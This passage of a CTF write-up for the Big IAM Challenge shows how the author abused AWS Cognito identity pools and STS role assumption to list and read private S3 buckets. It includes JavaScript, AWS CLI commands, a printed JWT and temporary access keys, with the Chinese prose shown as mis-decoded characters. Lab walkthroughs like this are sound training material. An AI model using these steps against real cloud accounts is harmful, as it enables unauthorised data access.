å³å¯ï¼š<code>https://thebigiamchallenge-admin-storage-abf1321.s3.amazonaws.com/files/flag-as-admin.txt</code></p><p>flagï¼š<code>&#123;wiz:principal-arn-is-not-what-you-think&#125;</code></p><p>åœ¨ä½¿ç”¨å‘½ä»¤è¡Œæ“ä½œçš„æ—¶å€™ï¼Œå› ä¸ºé»˜è®¤ä¼šå¸¦ä¸Šè‡ªå·± AWS CLI ä¸Šæ‰€é…ç½®çš„èº«ä»½ä¿¡æ¯ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦åŠ ä¸ŠÂ <code>--no-sign-request</code> å»ç»•è¿‡ï¼Œä½†æˆ‘ä»¬ä½¿ç”¨æµè§ˆå™¨è®¿é—®çš„æ—¶å€™ï¼Œå…¶å®æœ¬èº«å°±ä¸åŒ…å«èº«ä»½ä¿¡æ¯çš„ï¼Œæ‰€ä»¥è¿™é‡Œæœ‰ä¸ªæ›´ç®€å•çš„åšæ³•ï¼Œå°±æ˜¯ç›´æ¥ä½¿ç”¨æµè§ˆå™¨è®¿é—®ï¼Œç„¶ååŠ ä¸Šå‰ç¼€å°±è¡Œäº†ã€‚</p><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250829153406297.png"></p><hr><h1 id="Do-I-know-you"><a href="#Do-I-know-you" class="headerlink" title="Do I know you?"></a>Do I know you?</h1><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"Sid"</span><span class="token operator">:</span> <span class="token string">"VisualEditor0"</span><span class="token punctuation">,</span>            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"mobileanalytics:PutEvents"</span><span class="token punctuation">,</span>                <span class="token string">"cognito-sync:*"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"Resource"</span><span class="token operator">:</span> <span class="token string">"*"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"Sid"</span><span class="token operator">:</span> <span class="token string">"VisualEditor1"</span><span class="token punctuation">,</span>            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"s3:GetObject"</span><span class="token punctuation">,</span>                <span class="token string">"s3:ListBucket"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"Resource"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"arn:aws:s3:::wiz-privatefiles"</span><span class="token punctuation">,</span>                <span class="token string">"arn:aws:s3:::wiz-privatefiles/*"</span>            <span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œå¯ä»¥å¾—çŸ¥å’Œ cognito æœ‰å…³</p><p>åœ¨ challenge é¡µé¢çš„ html æºç ä¸­æ‰¾åˆ°ç›¸å…³çš„ sdk é…ç½®ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://sdk.amazonaws.com/js/aws-sdk-2.719.0.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token constant">AWS</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>region <span class="token operator">=</span> <span class="token string">'us-east-1'</span><span class="token punctuation">;</span>  <span class="token constant">AWS</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>credentials <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AWS<span class="token punctuation">.</span>CognitoIdentityCredentials</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">IdentityPoolId</span><span class="token operator">:</span> <span class="token string">"us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Set the region</span>  <span class="token constant">AWS</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">region</span><span class="token operator">:</span> <span class="token string">'us-east-1'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> s3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AWS<span class="token punctuation">.</span>S3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">Bucket</span><span class="token operator">:</span> <span class="token string">'wiz-privatefiles'</span><span class="token punctuation">,</span>      <span class="token literal-property property">Key</span><span class="token operator">:</span> <span class="token string">'cognito1.png'</span><span class="token punctuation">,</span>      <span class="token literal-property property">Expires</span><span class="token operator">:</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span>    <span class="token punctuation">&#125;</span>    signedUrl <span class="token operator">=</span> s3<span class="token punctuation">.</span><span class="token function">getSignedUrl</span><span class="token punctuation">(</span><span class="token string">'getObject'</span><span class="token punctuation">,</span> params<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#signedImg'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>äºæ˜¯æ‰¾åˆ°äº†èº«ä»½æ±  idï¼Œæ¥ä¸‹æ¥å°±æŒ‰ç…§å®˜æ–¹æ–‡æ¡£ç»™çš„æ–¹æ³•ç»“åˆ ai å†™ä¸ª javascript è·å–ä¸´æ—¶å‡­è¯å¹¶è®¿é—® s3</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span>Cognito JavaScript <span class="token constant">SDK</span> Example<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>    <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://sdk.amazonaws.com/js/aws-sdk-2.719.0.min.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span>    <span class="token operator">&lt;</span>script<span class="token operator">></span>        <span class="token constant">AWS</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>region <span class="token operator">=</span> <span class="token string">'us-east-1'</span><span class="token punctuation">;</span>        <span class="token constant">AWS</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>credentials <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AWS<span class="token punctuation">.</span>CognitoIdentityCredentials</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">IdentityPoolId</span><span class="token operator">:</span> <span class="token string">'us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b'</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Set the region</span>        <span class="token constant">AWS</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">var</span> accessKeyId <span class="token operator">=</span> <span class="token constant">AWS</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>accessKeyId<span class="token punctuation">;</span>                <span class="token keyword">var</span> secretAccessKey <span class="token operator">=</span> <span class="token constant">AWS</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>secretAccessKey<span class="token punctuation">;</span>                <span class="token keyword">var</span> sessionToken <span class="token operator">=</span> <span class="token constant">AWS</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>sessionToken<span class="token punctuation">;</span>                <span class="token comment">// è¿›è¡Œåç»­æ“ä½œï¼Œå¦‚è®¿é—®S3</span>                <span class="token function">accessS3</span><span class="token punctuation">(</span>accessKeyId<span class="token punctuation">,</span> secretAccessKey<span class="token punctuation">,</span> sessionToken<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// å‡­è¯è·å–å¤±è´¥</span>                console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error retrieving credentials: '</span> <span class="token operator">+</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// ä½¿ç”¨ä¸´æ—¶å‡­è¯è®¿é—®S3</span>        <span class="token keyword">function</span> <span class="token function">accessS3</span><span class="token punctuation">(</span><span class="token parameter">accessKeyId<span class="token punctuation">,</span> secretAccessKey<span class="token punctuation">,</span> sessionToken</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> s3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AWS<span class="token punctuation">.</span>S3</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                <span class="token literal-property property">accessKeyId</span><span class="token operator">:</span> accessKeyId<span class="token punctuation">,</span>                <span class="token literal-property property">secretAccessKey</span><span class="token operator">:</span> secretAccessKey<span class="token punctuation">,</span>                <span class="token literal-property property">sessionToken</span><span class="token operator">:</span> sessionToken<span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token literal-property property">Bucket</span><span class="token operator">:</span> <span class="token string">'wiz-privatefiles'</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            s3<span class="token punctuation">.</span><span class="token function">getSignedUrl</span><span class="token punctuation">(</span><span class="token string">'listObjectsV2'</span><span class="token punctuation">,</span> params<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// S3å­˜å‚¨æ¡¶åˆ—è¡¨è·å–æˆåŠŸ</span>                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// S3å­˜å‚¨æ¡¶åˆ—è¡¨è·å–å¤±è´¥</span>                    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error listing S3 buckets: '</span> <span class="token operator">+</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµè§ˆå™¨æ‰“å¼€è¿™ä¸ª htmlï¼ŒæŸ¥çœ‹æ§åˆ¶å°è¾“å‡º</p><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250830000305031.png"></p><p>è®¿é—®è¿™ä¸ªç½‘å€å³å¯</p><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250830000245970.png"></p><p>æˆåŠŸåˆ—å‡º s3 åˆ—è¡¨ï¼Œflag åœ¨ flag1.txt</p><p>æ¥ä¸‹æ¥ä¿®æ”¹ params å’Œæ“ä½œï¼Œæ”¹ä¸ºè¯»å–å¯¹è±¡</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">Bucket</span><span class="token operator">:</span> <span class="token string">'wiz-privatefiles'</span><span class="token punctuation">,</span>    <span class="token literal-property property">Key</span><span class="token operator">:</span> <span class="token string">'flag1.txt'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>s3<span class="token punctuation">.</span><span class="token function">getSignedUrl</span><span class="token punctuation">(</span><span class="token string">'getObject'</span><span class="token punctuation">,</span> params<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// S3å­˜å‚¨æ¡¶åˆ—è¡¨è·å–æˆåŠŸ</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// S3å­˜å‚¨æ¡¶åˆ—è¡¨è·å–å¤±è´¥</span>        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error listing S3 buckets: '</span> <span class="token operator">+</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŒæ ·çš„æ“ä½œå¾—åˆ° flagï¼š<code>&#123;wiz:incognito-is-always-suspicious&#125;</code></p><hr><h1 id="One-final-push"><a href="#One-final-push" class="headerlink" title="One final push"></a>One final push</h1><p>é¢˜ç›®ç»™äº† arnï¼š<code>arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role</code></p><p>policyï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"Federated"</span><span class="token operator">:</span> <span class="token string">"cognito-identity.amazonaws.com"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"sts:AssumeRoleWithWebIdentity"</span><span class="token punctuation">,</span>            <span class="token property">"Condition"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"StringEquals"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"cognito-identity.amazonaws.com:aud"</span><span class="token operator">:</span> <span class="token string">"us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„å¼€å¯äº† <code>sts:AssumeRoleWithWebIdentity</code>ï¼Œæ˜¯èº«ä»½éªŒè¯ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½åŒ¿åè®¿é—®äº†</p><p>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦è·å– stsï¼Œé‚£ä¹ˆå°±éœ€è¦å¡« <code>aws sts assume-role-with-web-identity</code> çš„ä¸‰ä¸ªå‚æ•°</p><p>ä¸»è¦è¿˜æ˜¯ web-identity-tokenï¼Œå…ˆç”¨èº«ä»½æ±  ID è·å–èº«ä»½ ID</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250830002804441.png"></p><p>ç„¶åä½¿ç”¨è¿™ä¸ªèº«ä»½ ID è·å– Token</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws cognito-identity get-open-id-token --identity-id us-east-1:157d6171-eef6-c763-d034-39cd202b0ada<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250830003042431.png"></p><p>æœ‰äº†è¿™ä¸ª token å°±å¯ä»¥ç”Ÿæˆ sts äº†</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws sts assume-role-with-web-identity <span class="token punctuation">\</span>--role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role <span class="token punctuation">\</span>--role-session-name 0w0 <span class="token punctuation">\</span>--web-identity-token eyJraWQiOiJ1cy1lYXN0LTEtOCIsInR5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWVmNi1jNzYzLWQwMzQtMzljZDIwMmIwYWRhIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3NTY0ODU2MjgsImlhdCI6MTc1NjQ4NTAyOH0.VVEI_jlpw2tk-Z7Au5IApbzhlWusbnprGZZE6D2WjDpXK0tc9Bz6onz1T64covdE0rggOLf1tGzjSu-bVSzh_1LECTtFXfsErNgIYYDASIM-iFjq2PFKqRr7QZpuP5Un9qrlVnU1mw-2E0xFzZSpwg4z9qzJBH7dKjRPwTqKh5WM0190SfoV1b3rgrfharFEae5ZhidktTRSRdFCGXEnoJgNj5YY3K3o7UNUASwLtVKM0jP5w4GMRSHHQWVE0KWzie15Iw_c5FfzH3dd8fZCs1SazMH7lzCyboP1rdLBC3TGNQFQH6i22sfV2d5_i1Sre7qAbt9fyfXzUX8YhymEPg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250830003844369.png"></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"Credentials"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"AccessKeyId"</span><span class="token operator">:</span> <span class="token string">"ASIARK7LBOHXFMEAHZU5"</span><span class="token punctuation">,</span>        <span class="token property">"SecretAccessKey"</span><span class="token operator">:</span> <span class="token string">"5ghLVu/IXeL2BMHoO7JiO1CJT33P+E/YHqBNfmsw"</span><span class="token punctuation">,</span>        <span class="token property">"SessionToken"</span><span class="token operator">:</span> <span class="token string">"FwoGZXIvYXdzEHoaDAsvsdJ4DMgQXNjY2SKbAl8kj1ScB/bpurTCdzzLxDoSI8XF9GVuLwje6bFIhiLUP6G+fXbfgu1Ql6+F79ghzcUsI/0m2iSQUKj0nHBSgHfIvhcfvCcmHPZsm0Nww97/+LpSfDgrCDvpkf+ypQK4okxRMoD/f74tOONH6tP4Brgt/hRv+xc/qM4IxlFklZaQPsFbGB8vx47NzVSS63U0Qoah5HxW9UaDmO+0mOJWUghjsHELj2QKzCtY6uZuqQD2LhWhzI43C9KGMZ26IjDD70Y/JM0efohLscVh5CE6VQOy/D72FHk6AEiIIO+Y+j4YuuYUIDw3ZPWbwuEaaNApD3RiBYqZ26Zt+G3d6+ii9cdcaWFip8WuAaASlgIKRQCLVhnxIsgzme0dpA8o+a7HxQYylgF+93pBvO0F78WlPCmwy2O1cCnFZUzXf6umF25GEqgo7wKh6BaTGo1jXbvgnpp9Rej1wRQo1Ol/niomudEvg1MgGOMRz2iesbQTv2pHG38Fi+nf4XMev/5dPEDA4vSEJynPg1C8RMuoyr+VVPapuluujlRYhoaklsJcer/Dco41ucTcUhV4qjIENRlAqQ59Fcke1WM5C1Q="</span><span class="token punctuation">,</span>        <span class="token property">"Expiration"</span><span class="token operator">:</span> <span class="token string">"2025-08-29T17:38:17Z"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"SubjectFromWebIdentityToken"</span><span class="token operator">:</span> <span class="token string">"us-east-1:157d6171-eef6-c763-d034-39cd202b0ada"</span><span class="token punctuation">,</span>    <span class="token property">"AssumedRoleUser"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"AssumedRoleId"</span><span class="token operator">:</span> <span class="token string">"AROARK7LBOHXASFTNOIZG:0w0"</span><span class="token punctuation">,</span>        <span class="token property">"Arn"</span><span class="token operator">:</span> <span class="token string">"arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/0w0"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"Provider"</span><span class="token operator">:</span> <span class="token string">"cognito-identity.amazonaws.com"</span><span class="token punctuation">,</span>    <span class="token property">"Audience"</span><span class="token operator">:</span> <span class="token string">"us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ° <code>AWS_ACCESS_KEY_ID</code>ã€<code>AWS_SECRET_ACCESS_KEY</code>ã€<code>AWS_SESSION_TOKEN</code></p><p>å¡«å…¥ä¹‹å‰çš„ javascript sdkï¼Œå…¶ä»–éƒ¨åˆ†ä¸ç”¨åŠ¨ï¼Œåªéœ€è¦ä¿®æ”¹ accessS3</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// ä½¿ç”¨ä¸´æ—¶å‡­è¯è®¿é—®S3</span><span class="token keyword">function</span> <span class="token function">accessS3</span><span class="token punctuation">(</span><span class="token parameter">accessKeyId<span class="token punctuation">,</span> secretAccessKey<span class="token punctuation">,</span> sessionToken</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> s3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AWS<span class="token punctuation">.</span>S3</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">accessKeyId</span><span class="token operator">:</span> <span class="token string">"ASIARK7LBOHXFMEAHZU5"</span><span class="token punctuation">,</span>        <span class="token literal-property property">secretAccessKey</span><span class="token operator">:</span> <span class="token string">"5ghLVu/IXeL2BMHoO7JiO1CJT33P+E/YHqBNfmsw"</span><span class="token punctuation">,</span>        <span class="token literal-property property">sessionToken</span><span class="token operator">:</span> <span class="token string">"FwoGZXIvYXdzEHoaDAsvsdJ4DMgQXNjY2SKbAl8kj1ScB/bpurTCdzzLxDoSI8XF9GVuLwje6bFIhiLUP6G+fXbfgu1Ql6+F79ghzcUsI/0m2iSQUKj0nHBSgHfIvhcfvCcmHPZsm0Nww97/+LpSfDgrCDvpkf+ypQK4okxRMoD/f74tOONH6tP4Brgt/hRv+xc/qM4IxlFklZaQPsFbGB8vx47NzVSS63U0Qoah5HxW9UaDmO+0mOJWUghjsHELj2QKzCtY6uZuqQD2LhWhzI43C9KGMZ26IjDD70Y/JM0efohLscVh5CE6VQOy/D72FHk6AEiIIO+Y+j4YuuYUIDw3ZPWbwuEaaNApD3RiBYqZ26Zt+G3d6+ii9cdcaWFip8WuAaASlgIKRQCLVhnxIsgzme0dpA8o+a7HxQYylgF+93pBvO0F78WlPCmwy2O1cCnFZUzXf6umF25GEqgo7wKh6BaTGo1jXbvgnpp9Rej1wRQo1Ol/niomudEvg1MgGOMRz2iesbQTv2pHG38Fi+nf4XMev/5dPEDA4vSEJynPg1C8RMuoyr+VVPapuluujlRYhoaklsJcer/Dco41ucTcUhV4qjIENRlAqQ59Fcke1WM5C1Q="</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">Bucket</span><span class="token operator">:</span> <span class="token string">'wiz-privatefiles-x1000'</span><span class="token punctuation">,</span>        <span class="token comment">// Key: 'flag1.txt',</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    s3<span class="token punctuation">.</span><span class="token function">getSignedUrl</span><span class="token punctuation">(</span><span class="token string">'listObjectsV2'</span><span class="token punctuation">,</span> params<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// S3å­˜å‚¨æ¡¶åˆ—è¡¨è·å–æˆåŠŸ</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// S3å­˜å‚¨æ¡¶åˆ—è¡¨è·å–å¤±è´¥</span>            console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error listing S3 buckets: '</span> <span class="token operator">+</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 